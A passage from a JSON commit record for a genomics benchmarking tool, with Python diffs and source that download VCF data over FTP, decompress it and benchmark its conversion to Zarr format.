"        Executes the benchmarking process.", "        \"\"\"", "        if self.bench_conf is not None and self.data_dirs is not None:", "            for run_number in range(1, self.bench_conf.benchmark_number_runs + 1):", "                data_service.remove_directory_tree(self.data_dirs.zarr_dir_benchmark)", "                self.benchmark_profiler.set_run_number(run_number)", "                if self.bench_conf.benchmark_data_input == \"vcf\":", "                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark", "                    self._benchmark_convert_to_zarr()", "                elif self.bench_conf.benchmark_data_input == \"zarr\":", "                    self.benchmark_zarr_dir = self.data_dirs.zarr_dir_setup", "                    self.benchmark_zarr_file = self.bench_conf.benchmark_dataset", "                else:", "                    print(\"[Exec] Error: Invalid option supplied for benchmark data input format.\")", "                    print(\"  - Expected data input formats: vcf, zarr\")", "                    print(\"  - Provided data input format: {}\".format(self.bench_conf.benchmark_data_input))", "                    exit(1)", "                benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)", "                if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):", "                    pass", "                else:", "                    print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")", "                    print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))", "    def _benchmark_convert_to_zarr(self):", "        self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark", "        input_vcf_file = self.bench_conf.benchmark_dataset", "        input_vcf_path = os.path.join(self.data_dirs.vcf_dir, input_vcf_file)", "        if os.path.isfile(input_vcf_path):", "            output_zarr_file = input_vcf_file", "            output_zarr_file = output_zarr_file[", "                               0:len(output_zarr_file) - 4]  # Truncate *.vcf from input filename", "            output_zarr_path = os.path.join(self.data_dirs.zarr_dir_benchmark, output_zarr_file)", "            data_service.convert_to_zarr(input_vcf_path=input_vcf_path,", "                                         output_zarr_path=output_zarr_path,", "                                         conversion_config=self.bench_conf.vcf_to_zarr_config,", "                                         benchmark_runner=self.benchmark_profiler)", "            self.benchmark_zarr_file = output_zarr_file", "        else:", "            print(\"[Exec] Error: Dataset specified in configuration file does not exist. Exiting...\")", "            print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))", "            print(\"  - Expected file location: {}\".format(input_vcf_path))", "            exit("]}], "source": "\n\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, determines the runtime mode(dynamic vs. static); if dynamic, gets the benchmark data from the server, runs the benchmarks, and records the timer results. \"\"\" import time import csv import logging def run_benchmark(bench_conf): pass def run_dynamic(ftp_location): pass def run_static(): pass def get_remote_files(ftp_server, ftp_directory, files=None): pass def record_runtime(benchmark, timestamp): pass def main(): pass ", "sourceWithComments": "\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, \ndetermines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\nruns the benchmarks, and records the timer results. \"\"\"\n\nimport time  # for benchmark timer\nimport csv  # for writing results\nimport logging\n\n\ndef run_benchmark(bench_conf):\n    pass\n\n\ndef run_dynamic(ftp_location):\n    pass\n\n\ndef run_static():\n    pass\n\n\ndef get_remote_files(ftp_server, ftp_directory, files=None):\n    pass\n\n\ndef record_runtime(benchmark, timestamp):\n    pass\n\n\n# temporary here\ndef main():\n    pass\n"}, "/benchmark/data_service.py": {"changes": [{"diff": "\n import numpy as np\n import zarr\n import numcodecs\n-from numcodecs import Blosc, LZ4, LZMA\n-from benchmark import config\n+from numcodecs import Blosc\n \n import gzip\n import shutil\n", "add": 1, "remove": 2, "filename": "/benchmark/data_service.py", "badparts": ["from numcodecs import Blosc, LZ4, LZMA", "from benchmark import config"], "goodparts": ["from numcodecs import Blosc"]}, {"diff": "\n                         conversion_config=conversion_config)\n \n \n-def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n+def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):\n     \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n+    If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.\n     :param input_vcf_path: The input VCF file location\n     :param output_zarr_path: The desired Zarr output location\n     :param conversion_config: Configuration data for the conversion\n+    :param benchmark_runner: BenchmarkRunner object to be used for benchmarking process\n     :type input_vcf_path: str\n     :type output_zarr_path: str\n     :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n+    :type benchmark_runner: core.BenchmarkProfiler\n     \"\"\"\n     if conversion_config is not None:\n         # Ensure var is string, not pathlib.Path\n         output_zarr_path = str(output_zarr_path)\n \n+        # Get fields to extract (for unit testing only)\n+        fields = conversion_config.fields\n+\n         # Get alt number\n         if conversion_config.alt_number is None:\n             print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n", "add": 7, "remove": 1, "filename": "/benchmark/data_service.py", "badparts": ["def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):"], "goodparts": ["def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):", "    If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.", "    :param benchmark_runner: BenchmarkRunner object to be used for benchmarking process", "    :type benchmark_runner: core.BenchmarkProfiler", "        fields = conversion_config.fields"]}, {"diff": "\n         else:\n             raise ValueError(\"Unexpected compressor type specified.\")\n \n-        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))\n+        if benchmark_runner is not None:\n+            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")\n \n-        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")\n         # Perform the VCF to Zarr conversion\n-        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,\n+        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,\n                           log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n-        print(\"[VCF-Zarr] Done.\")\n+\n+        if benchmark_runner is not None:\n+            benchmark_runner.end_benchmark()\n+\n+\n+GENOTYPE_ARRAY_NORMAL = 0\n+GENOTYPE_ARRAY_DASK = 1\n+GENOTYPE_ARRAY_CHUNKED = 2\n+\n+\n+def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):\n+    genotype_ref_name = ''\n+\n+    # Ensure 'calldata' is within the callset\n+    if 'calldata' in callset:\n+        # Try to find either GT or genotype in calldata\n+        if 'GT' in callset['calldata']:\n+            genotype_ref_name = 'GT'\n+        elif 'genotype' in callset['calldata']:\n+            genotype_ref_name = 'genotype'\n+        else:\n+            return None\n+    else:\n+        return None\n+\n+    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:\n+        return allel.GenotypeArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_DASK:\n+        return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:\n+        return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])\n+    else:\n+        return N", "add": 36, "remove": 4, "filename": "/benchmark/data_service.py", "badparts": ["        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))", "        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")", "        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,", "        print(\"[VCF-Zarr] Done.\")"], "goodparts": ["        if benchmark_runner is not None:", "            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")", "        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,", "        if benchmark_runner is not None:", "            benchmark_runner.end_benchmark()", "GENOTYPE_ARRAY_NORMAL = 0", "GENOTYPE_ARRAY_DASK = 1", "GENOTYPE_ARRAY_CHUNKED = 2", "def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):", "    genotype_ref_name = ''", "    if 'calldata' in callset:", "        if 'GT' in callset['calldata']:", "            genotype_ref_name = 'GT'", "        elif 'genotype' in callset['calldata']:", "            genotype_ref_name = 'genotype'", "        else:", "            return None", "    else:", "        return None", "    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:", "        return allel.GenotypeArray(callset['calldata'][genotype_ref_name])", "    elif genotype_array_type == GENOTYPE_ARRAY_DASK:", "        return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])", "    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:", "        return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])", "    else:", "        return N"]}], "source": "\n\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, determines the runtime mode(dynamic vs. static); if dynamic, gets the benchmark data from the server, runs the benchmarks, and records the timer results. \"\"\" import urllib.request from ftplib import FTP, FTP_TLS, error_perm import time import csv import logging import os.path import pathlib import allel import sys import functools import numpy as np import zarr import numcodecs from numcodecs import Blosc, LZ4, LZMA from benchmark import config import gzip import shutil def create_directory_tree(path): \"\"\" Creates directories for the path specified. :param path: The path to create dirs/subdirs for :type path: str \"\"\" path=str(path) pathlib.Path(path).mkdir(parents=True, exist_ok=True) def remove_directory_tree(path): \"\"\" Removes the directory and all subdirectories/files within the path specified. :param path: The path to the directory to remove :type path: str \"\"\" if os.path.exists(path): shutil.rmtree(path, ignore_errors=True) def fetch_data_via_ftp(ftp_config, local_directory): \"\"\" Get benchmarking data from a remote ftp server. :type ftp_config: config.FTPConfigurationRepresentation :type local_directory: str \"\"\" if ftp_config.enabled: create_directory_tree(local_directory) if ftp_config.use_tls: ftp=FTP_TLS(ftp_config.server) ftp.login(ftp_config.username, ftp_config.password) ftp.prot_p() else: ftp=FTP(ftp_config.server) ftp.login(ftp_config.username, ftp_config.password) if not ftp_config.files: fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory, remote_directory=ftp_config.directory) else: ftp.cwd(ftp_config.directory) file_counter=1 file_list_total=len(ftp_config.files) for remote_filename in ftp_config.files: local_filename=remote_filename filepath=os.path.join(local_directory, local_filename) if not os.path.exists(filepath): with open(filepath, \"wb\") as local_file: try: ftp.retrbinary('RETR %s' % remote_filename, local_file.write) print(\"[Setup][FTP]({}/{}) File downloaded:{}\".format(file_counter, file_list_total, filepath)) except error_perm: print(\"[Setup][FTP]({}/{}) Error downloading file. Skipping:{}\".format(file_counter, file_list_total, filepath)) local_file.close() os.remove(filepath) else: print(\"[Setup][FTP]({}/{}) File already exists. Skipping:{}\".format(file_counter, file_list_total, filepath)) file_counter=file_counter +1 ftp.close() def fetch_data_via_ftp_recursive(ftp, local_directory, remote_directory, remote_subdirs_list=None): \"\"\" Recursive function that automatically downloads all files with a FTP directory, including subdirectories. :type ftp: ftplib.FTP :type local_directory: str :type remote_directory: str :type remote_subdirs_list: list \"\"\" if(remote_subdirs_list is not None) and(len(remote_subdirs_list) > 0): remote_path_relative=\"/\".join(remote_subdirs_list) remote_path_absolute=\"/\" +remote_directory +\"/\" +remote_path_relative +\"/\" else: remote_subdirs_list=[] remote_path_relative=\"\" remote_path_absolute=\"/\" +remote_directory +\"/\" try: local_path=local_directory +\"/\" +remote_path_relative os.mkdir(local_path) print(\"[Setup][FTP] Created local folder:{}\".format(local_path)) except OSError: pass except error_perm: print(\"[Setup][FTP] Error: Could not change to:{}\".format(remote_path_absolute)) ftp.cwd(remote_path_absolute) file_list=ftp.nlst() file_counter=1 file_list_total=len(file_list) for file in file_list: file_path_local=local_directory +\"/\" +remote_path_relative +\"/\" +file if not os.path.isfile(file_path_local): try: ftp.cwd(remote_path_absolute +file) print(\"[Setup][FTP] Switching to directory:{}\".format(remote_path_relative +\"/\" +file)) new_remote_subdirs_list=remote_subdirs_list.copy() new_remote_subdirs_list.append(file) fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory, remote_directory=remote_directory, remote_subdirs_list=new_remote_subdirs_list) ftp.cwd(remote_path_absolute) except error_perm: temp=ftp.nlst() if not os.path.isfile(file_path_local): with open(file_path_local, \"wb\") as local_file: ftp.retrbinary('RETR{}'.format(file), local_file.write) print(\"[Setup][FTP]({}/{}) File downloaded:{}\".format(file_counter, file_list_total, file_path_local)) else: print(\"[Setup][FTP]({}/{}) File already exists. Skipping:{}\".format(file_counter, file_list_total, file_path_local)) file_counter=file_counter +1 def fetch_file_from_url(url, local_file): urllib.request.urlretrieve(url, local_file) def decompress_gzip(local_file_gz, local_file): with open(local_file, 'wb') as file_out, gzip.open(local_file_gz, 'rb') as file_in: shutil.copyfileobj(file_in, file_out) def process_data_files(input_dir, temp_dir, output_dir): \"\"\" Iterates through all files in input_dir and processes *.vcf.gz files to *.vcf, placed in output_dir. Additionally moves *.vcf files to output_dir Note: This method searches through all subdirectories within input_dir, and files are placed in root of output_dir. :param input_dir: The input directory containing files to process :param temp_dir: The temporary directory for unzipping *.gz files, etc. :param output_dir: The output directory where processed *.vcf files should go :type input_dir: str :type temp_dir: str :type output_dir: str \"\"\" input_dir=str(input_dir) temp_dir=str(temp_dir) output_dir=str(output_dir) create_directory_tree(input_dir) create_directory_tree(temp_dir) create_directory_tree(output_dir) pathlist_gz=pathlib.Path(input_dir).glob(\"**/*.gz\") for path in pathlist_gz: path_str=str(path) file_output_str=path_leaf(path_str) file_output_str=file_output_str[0:len(file_output_str) -3] path_temp_output=str(pathlib.Path(temp_dir, file_output_str)) print(\"[Setup][Data] Decompressing file:{}\".format(path_str)) print(\" -Output:{}\".format(path_temp_output)) decompress_gzip(path_str, path_temp_output) pathlist_vcf_temp=pathlib.Path(temp_dir).glob(\"**/*.vcf\") for path in pathlist_vcf_temp: path_temp_str=str(path) filename_str=path_leaf(path_temp_str) path_vcf_str=str(pathlib.Path(output_dir, filename_str)) shutil.move(path_temp_str, path_vcf_str) remove_directory_tree(temp_dir) pathlist_vcf_input=pathlib.Path(input_dir).glob(\"**/*.vcf\") for path in pathlist_vcf_input: path_input_str=str(path) filename_str=path_leaf(path_input_str) path_vcf_str=str(pathlib.Path(output_dir, filename_str)) shutil.copy(path_input_str, path_vcf_str) def path_head(path): head, tail=os.path.split(path) return head def path_leaf(path): head, tail=os.path.split(path) return tail or os.path.basename(head) def read_file_contents(local_filepath): if os.path.isfile(local_filepath): with open(local_filepath) as f: data=f.read() return data else: return None def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config): \"\"\" Converts all VCF files in input directory to Zarr format, placed in output directory, based on conversion configuration parameters :param input_vcf_dir: The input directory where VCF files are located :param output_zarr_dir: The output directory to place Zarr-formatted data :param conversion_config: Configuration data for the conversion :type input_vcf_dir: str :type output_zarr_dir: str :type conversion_config: config.VCFtoZarrConfigurationRepresentation \"\"\" input_vcf_dir=str(input_vcf_dir) output_zarr_dir=str(output_zarr_dir) create_directory_tree(input_vcf_dir) create_directory_tree(output_zarr_dir) pathlist_vcf=pathlib.Path(input_vcf_dir).glob(\"**/*.vcf\") for path in pathlist_vcf: path_str=str(path) file_output_str=path_leaf(path_str) file_output_str=file_output_str[0:len(file_output_str) -4] path_zarr_output=str(pathlib.Path(output_zarr_dir, file_output_str)) print(\"[Setup][Data] Converting VCF file to Zarr format:{}\".format(path_str)) print(\" -Output:{}\".format(path_zarr_output)) convert_to_zarr(input_vcf_path=path_str, output_zarr_path=path_zarr_output, conversion_config=conversion_config) def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config): \"\"\" Converts the original data(VCF) to a Zarr format. Only converts a single VCF file. :param input_vcf_path: The input VCF file location :param output_zarr_path: The desired Zarr output location :param conversion_config: Configuration data for the conversion :type input_vcf_path: str :type output_zarr_path: str :type conversion_config: config.VCFtoZarrConfigurationRepresentation \"\"\" if conversion_config is not None: output_zarr_path=str(output_zarr_path) if conversion_config.alt_number is None: print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\") callset=allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout) numalt=callset['variants/numalt'] alt_number=np.max(numalt) else: print(\"[VCF-Zarr] Using alt number provided in configuration.\") alt_number=conversion_config.alt_number print(\"[VCF-Zarr] Alt number:{}\".format(alt_number)) chunk_length=allel.vcf_read.DEFAULT_CHUNK_LENGTH if conversion_config.chunk_length is not None: chunk_length=conversion_config.chunk_length print(\"[VCF-Zarr] Chunk length:{}\".format(chunk_length)) chunk_width=allel.vcf_read.DEFAULT_CHUNK_WIDTH if conversion_config.chunk_width is not None: chunk_width=conversion_config.chunk_width print(\"[VCF-Zarr] Chunk width:{}\".format(chunk_width)) if conversion_config.compressor==\"Blosc\": compressor=Blosc(cname=conversion_config.blosc_compression_algorithm, clevel=conversion_config.blosc_compression_level, shuffle=conversion_config.blosc_shuffle_mode) else: raise ValueError(\"Unexpected compressor type specified.\") print(\"[VCF-Zarr] Using{} compressor.\".format(conversion_config.compressor)) print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\") allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width) print(\"[VCF-Zarr] Done.\") ", "sourceWithComments": "\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, \ndetermines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\nruns the benchmarks, and records the timer results. \"\"\"\n\nimport urllib.request\nfrom ftplib import FTP, FTP_TLS, error_perm\nimport time  # for benchmark timer\nimport csv  # for writing results\nimport logging\nimport os.path\nimport pathlib\nimport allel\nimport sys\nimport functools\nimport numpy as np\nimport zarr\nimport numcodecs\nfrom numcodecs import Blosc, LZ4, LZMA\nfrom benchmark import config\n\nimport gzip\nimport shutil\n\n\ndef create_directory_tree(path):\n    \"\"\"\n    Creates directories for the path specified.\n    :param path: The path to create dirs/subdirs for\n    :type path: str\n    \"\"\"\n    path = str(path)  # Ensure path is in str format\n    pathlib.Path(path).mkdir(parents=True, exist_ok=True)\n\n\ndef remove_directory_tree(path):\n    \"\"\"\n    Removes the directory and all subdirectories/files within the path specified.\n    :param path: The path to the directory to remove\n    :type path: str\n    \"\"\"\n\n    if os.path.exists(path):\n        shutil.rmtree(path, ignore_errors=True)\n\n\ndef fetch_data_via_ftp(ftp_config, local_directory):\n    \"\"\" Get benchmarking data from a remote ftp server. \n    :type ftp_config: config.FTPConfigurationRepresentation\n    :type local_directory: str\n    \"\"\"\n    if ftp_config.enabled:\n        # Create local directory tree if it does not exist\n        create_directory_tree(local_directory)\n\n        # Login to FTP server\n        if ftp_config.use_tls:\n            ftp = FTP_TLS(ftp_config.server)\n            ftp.login(ftp_config.username, ftp_config.password)\n            ftp.prot_p()  # Request secure data connection for file retrieval\n        else:\n            ftp = FTP(ftp_config.server)\n            ftp.login(ftp_config.username, ftp_config.password)\n\n        if not ftp_config.files:  # Auto-download all files in directory\n            fetch_data_via_ftp_recursive(ftp=ftp,\n                                         local_directory=local_directory,\n                                         remote_directory=ftp_config.directory)\n        else:\n            ftp.cwd(ftp_config.directory)\n\n            file_counter = 1\n            file_list_total = len(ftp_config.files)\n\n            for remote_filename in ftp_config.files:\n                local_filename = remote_filename\n                filepath = os.path.join(local_directory, local_filename)\n                if not os.path.exists(filepath):\n                    with open(filepath, \"wb\") as local_file:\n                        try:\n                            ftp.retrbinary('RETR %s' % remote_filename, local_file.write)\n                            print(\"[Setup][FTP] ({}/{}) File downloaded: {}\".format(file_counter, file_list_total,\n                                                                                    filepath))\n                        except error_perm:\n                            # Error downloading file. Display error message and delete local file\n                            print(\"[Setup][FTP] ({}/{}) Error downloading file. Skipping: {}\".format(file_counter,\n                                                                                                     file_list_total,\n                                                                                                     filepath))\n                            local_file.close()\n                            os.remove(filepath)\n                else:\n                    print(\"[Setup][FTP] ({}/{}) File already exists. Skipping: {}\".format(file_counter, file_list_total,\n                                                                                          filepath))\n                file_counter = file_counter + 1\n        # Close FTP connection\n        ftp.close()\n\n\ndef fetch_data_via_ftp_recursive(ftp, local_directory, remote_directory, remote_subdirs_list=None):\n    \"\"\"\n    Recursive function that automatically downloads all files with a FTP directory, including subdirectories.\n    :type ftp: ftplib.FTP\n    :type local_directory: str\n    :type remote_directory: str\n    :type remote_subdirs_list: list\n    \"\"\"\n\n    if (remote_subdirs_list is not None) and (len(remote_subdirs_list) > 0):\n        remote_path_relative = \"/\".join(remote_subdirs_list)\n        remote_path_absolute = \"/\" + remote_directory + \"/\" + remote_path_relative + \"/\"\n    else:\n        remote_subdirs_list = []\n        remote_path_relative = \"\"\n        remote_path_absolute = \"/\" + remote_directory + \"/\"\n\n    try:\n        local_path = local_directory + \"/\" + remote_path_relative\n        os.mkdir(local_path)\n        print(\"[Setup][FTP] Created local folder: {}\".format(local_path))\n    except OSError:  # Folder already exists at destination. Do nothing.\n        pass\n    except error_perm:  # Invalid Entry\n        print(\"[Setup][FTP] Error: Could not change to: {}\".format(remote_path_absolute))\n\n    ftp.cwd(remote_path_absolute)\n\n    # Get list of remote files/folders in current directory\n    file_list = ftp.nlst()\n\n    file_counter = 1\n    file_list_total = len(file_list)\n\n    for file in file_list:\n        file_path_local = local_directory + \"/\" + remote_path_relative + \"/\" + file\n        if not os.path.isfile(file_path_local):\n            try:\n                # Determine if a file or folder\n                ftp.cwd(remote_path_absolute + file)\n                # Path is for a folder. Run recursive function in new folder\n                print(\"[Setup][FTP] Switching to directory: {}\".format(remote_path_relative + \"/\" + file))\n                new_remote_subdirs_list = remote_subdirs_list.copy()\n                new_remote_subdirs_list.append(file)\n                fetch_data_via_ftp_recursive(ftp=ftp, local_directory=local_directory,\n                                             remote_directory=remote_directory,\n                                             remote_subdirs_list=new_remote_subdirs_list)\n                # Return up one level since we are using recursion\n                ftp.cwd(remote_path_absolute)\n            except error_perm:\n                # file is an actual file. Download if it doesn't already exist on filesystem.\n                temp = ftp.nlst()\n                if not os.path.isfile(file_path_local):\n                    with open(file_path_local, \"wb\") as local_file:\n                        ftp.retrbinary('RETR {}'.format(file), local_file.write)\n                    print(\"[Setup][FTP] ({}/{}) File downloaded: {}\".format(file_counter, file_list_total,\n                                                                            file_path_local))\n        else:\n            print(\"[Setup][FTP] ({}/{}) File already exists. Skipping: {}\".format(file_counter, file_list_total,\n                                                                                  file_path_local))\n        file_counter = file_counter + 1\n\n\ndef fetch_file_from_url(url, local_file):\n    urllib.request.urlretrieve(url, local_file)\n\n\ndef decompress_gzip(local_file_gz, local_file):\n    with open(local_file, 'wb') as file_out, gzip.open(local_file_gz, 'rb') as file_in:\n        shutil.copyfileobj(file_in, file_out)\n\n\ndef process_data_files(input_dir, temp_dir, output_dir):\n    \"\"\"\n    Iterates through all files in input_dir and processes *.vcf.gz files to *.vcf, placed in output_dir.\n    Additionally moves *.vcf files to output_dir\n    Note: This method searches through all subdirectories within input_dir, and files are placed in root of output_dir.\n    :param input_dir: The input directory containing files to process\n    :param temp_dir: The temporary directory for unzipping *.gz files, etc.\n    :param output_dir: The output directory where processed *.vcf files should go\n    :type input_dir: str\n    :type temp_dir: str\n    :type output_dir: str\n    \"\"\"\n\n    # Ensure input, temp, and output directory paths are in str format, not pathlib\n    input_dir = str(input_dir)\n    temp_dir = str(temp_dir)\n    output_dir = str(output_dir)\n\n    # Create input, temp, and output directories if they do not exist\n    create_directory_tree(input_dir)\n    create_directory_tree(temp_dir)\n    create_directory_tree(output_dir)\n\n    # Iterate through all *.gz files in input directory and uncompress them to the temporary directory\n    pathlist_gz = pathlib.Path(input_dir).glob(\"**/*.gz\")\n    for path in pathlist_gz:\n        path_str = str(path)\n        file_output_str = path_leaf(path_str)\n        file_output_str = file_output_str[0:len(file_output_str) - 3]  # Truncate *.gz from input filename\n        path_temp_output = str(pathlib.Path(temp_dir, file_output_str))\n        print(\"[Setup][Data] Decompressing file: {}\".format(path_str))\n        print(\"  - Output: {}\".format(path_temp_output))\n\n        # Decompress the .gz file\n        decompress_gzip(path_str, path_temp_output)\n\n    # Iterate through all files in temporary directory and move *.vcf files to output directory\n    pathlist_vcf_temp = pathlib.Path(temp_dir).glob(\"**/*.vcf\")\n    for path in pathlist_vcf_temp:\n        path_temp_str = str(path)\n        filename_str = path_leaf(path_temp_str)  # Strip filename from path\n        path_vcf_str = str(pathlib.Path(output_dir, filename_str))\n\n        shutil.move(path_temp_str, path_vcf_str)\n\n    # Remove temporary directory\n    remove_directory_tree(temp_dir)\n\n    # Copy any *.vcf files already in input directory to the output directory\n    pathlist_vcf_input = pathlib.Path(input_dir).glob(\"**/*.vcf\")\n    for path in pathlist_vcf_input:\n        path_input_str = str(path)\n        filename_str = path_leaf(path_input_str)  # Strip filename from path\n        path_vcf_str = str(pathlib.Path(output_dir, filename_str))\n\n        shutil.copy(path_input_str, path_vcf_str)\n\n\ndef path_head(path):\n    head, tail = os.path.split(path)\n    return head\n\n\ndef path_leaf(path):\n    head, tail = os.path.split(path)\n    return tail or os.path.basename(head)\n\n\ndef read_file_contents(local_filepath):\n    if os.path.isfile(local_filepath):\n        with open(local_filepath) as f:\n            data = f.read()\n            return data\n    else:\n        return None\n\n\ndef setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):\n    \"\"\"\n    Converts all VCF files in input directory to Zarr format, placed in output directory,\n    based on conversion configuration parameters\n    :param input_vcf_dir: The input directory where VCF files are located\n    :param output_zarr_dir: The output directory to place Zarr-formatted data\n    :param conversion_config: Configuration data for the conversion\n    :type input_vcf_dir: str\n    :type output_zarr_dir: str\n    :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n    \"\"\"\n    # Ensure input and output directory paths are in str format, not pathlib\n    input_vcf_dir = str(input_vcf_dir)\n    output_zarr_dir = str(output_zarr_dir)\n\n    # Create input and output directories if they do not exist\n    create_directory_tree(input_vcf_dir)\n    create_directory_tree(output_zarr_dir)\n\n    # Iterate through all *.vcf files in input directory and convert to Zarr format\n    pathlist_vcf = pathlib.Path(input_vcf_dir).glob(\"**/*.vcf\")\n    for path in pathlist_vcf:\n        path_str = str(path)\n        file_output_str = path_leaf(path_str)\n        file_output_str = file_output_str[0:len(file_output_str) - 4]  # Truncate *.vcf from input filename\n        path_zarr_output = str(pathlib.Path(output_zarr_dir, file_output_str))\n        print(\"[Setup][Data] Converting VCF file to Zarr format: {}\".format(path_str))\n        print(\"  - Output: {}\".format(path_zarr_output))\n\n        # Convert to Zarr format\n        convert_to_zarr(input_vcf_path=path_str,\n                        output_zarr_path=path_zarr_output,\n                        conversion_config=conversion_config)\n\n\ndef convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n    \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n    :param input_vcf_path: The input VCF file location\n    :param output_zarr_path: The desired Zarr output location\n    :param conversion_config: Configuration data for the conversion\n    :type input_vcf_path: str\n    :type output_zarr_path: str\n    :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n    \"\"\"\n    if conversion_config is not None:\n        # Ensure var is string, not pathlib.Path\n        output_zarr_path = str(output_zarr_path)\n\n        # Get alt number\n        if conversion_config.alt_number is None:\n            print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n            # Scan VCF file to find max number of alleles in any variant\n            callset = allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout)\n            numalt = callset['variants/numalt']\n            alt_number = np.max(numalt)\n        else:\n            print(\"[VCF-Zarr] Using alt number provided in configuration.\")\n            # Use the configuration-provided alt number\n            alt_number = conversion_config.alt_number\n        print(\"[VCF-Zarr] Alt number: {}\".format(alt_number))\n\n        # Get chunk length\n        chunk_length = allel.vcf_read.DEFAULT_CHUNK_LENGTH\n        if conversion_config.chunk_length is not None:\n            chunk_length = conversion_config.chunk_length\n        print(\"[VCF-Zarr] Chunk length: {}\".format(chunk_length))\n\n        # Get chunk width\n        chunk_width = allel.vcf_read.DEFAULT_CHUNK_WIDTH\n        if conversion_config.chunk_width is not None:\n            chunk_width = conversion_config.chunk_width\n        print(\"[VCF-Zarr] Chunk width: {}\".format(chunk_width))\n\n        if conversion_config.compressor == \"Blosc\":\n            compressor = Blosc(cname=conversion_config.blosc_compression_algorithm,\n                               clevel=conversion_config.blosc_compression_level,\n                               shuffle=conversion_config.blosc_shuffle_mode)\n        else:\n            raise ValueError(\"Unexpected compressor type specified.\")\n\n        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))\n\n        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")\n        # Perform the VCF to Zarr conversion\n        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,\n                          log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n        print(\"[VCF-Zarr] Done.\")\n"}}, "msg": "Implement Benchmark Process (#29)\n\n* Update project environment, default config file, and AUTHORS\r\n\r\n-Update .gitignore to ignore test config file and IntelliJ IDEA project files\r\n-Update AUTHORS file with new contributor\r\n-Environment: Add perf and numcodecs libraries as dependencies\r\n-Config file: Update file to include spaces for consistency\r\n-Update benchmark config file to include new (future) options for ftp download and data conversion\r\n\r\n* Remove IntelliJ IDE files from code base\r\n\r\n* -Create config.py to hold functions/data for config file parsing and handling\r\n-cli.py: Move configuration-related functions to config.py & create main() function\r\n-test_cli.py: Move configuration-related unit tests to test_config.py\r\n-Update README.md to show that -f flag can be used when generating a configuration file\r\n\r\n* Add placeholder methods for unit testing: generate default configuration w/ and w/o -f flag\r\n\r\n* Begin implementing \"setup\" command, including download of files over FTP\r\n\r\n- cli.py: Add logic when running in setup mode\r\n- config.py: Add ability to read/parse configuration settings related to FTP downloader\r\n- data_service.py: Implement ftp downloading, including the ability to download all files within a remote ftp directory (recursive download)\r\n- test_data_service.py: Add unit tests for ftp download checking\r\n\r\n* Add unittest for default configuration file 